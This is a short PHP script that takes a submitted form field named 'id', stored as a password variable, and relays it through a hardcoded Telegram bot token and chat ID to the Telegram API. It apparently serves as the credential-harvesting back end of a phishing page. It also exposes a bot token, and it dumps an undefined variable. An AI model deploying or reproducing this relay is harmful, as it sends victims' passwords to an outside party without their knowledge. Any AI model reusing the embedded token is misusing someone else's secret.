<?php

$pass = $_POST['id'];

$token = '5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64';

$array = array(
	'chat_id'=> 961145889,
	'text' =>$pass,
	'parse_mode'=>'html'
);

$ch = curl_init();
curl_setopt($ch,CURLOPT_URL, 'https://api.telegram.org/bot'.$token.'/sendMessage');

curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array,"",'&'));
$output = curl_exec($ch);
    // закрытие сеанса curl для освобождения системных ресурсов
curl_close($ch);
echo "<pre>";
var_dump(json_decode($result));
echo '</pre>';
